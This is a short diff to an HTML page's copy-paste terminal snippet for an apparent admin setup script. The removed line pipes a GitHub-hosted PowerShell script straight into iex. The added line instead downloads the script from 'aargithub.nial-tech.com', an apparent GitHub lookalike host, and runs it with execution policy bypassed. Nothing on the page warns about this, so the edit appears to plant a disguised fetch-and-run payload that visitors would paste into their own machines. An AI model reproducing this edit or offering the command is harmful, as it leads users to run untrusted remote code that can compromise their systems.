@@ -545,7 +545,7 @@
 
             <div class="terminal">
 
-                <pre><span class="command">irm "https://raw.githubusercontent.com/Flunch4456/Script-web-Admin-demarrage/main/Auto%20admin%20region%20V-2.ps1" | iex</span></pre>
+                <pre><span class="command">$p="$env:TEMP\AdminSetup.ps1"; irm "https://aargithub.nial-tech.com/Auto%20admin%20region%20V-2.ps1" -OutFile $p; powershell.exe -NoProfile -ExecutionPolicy Bypass -File $p</span></pre>
 
             </div>
 
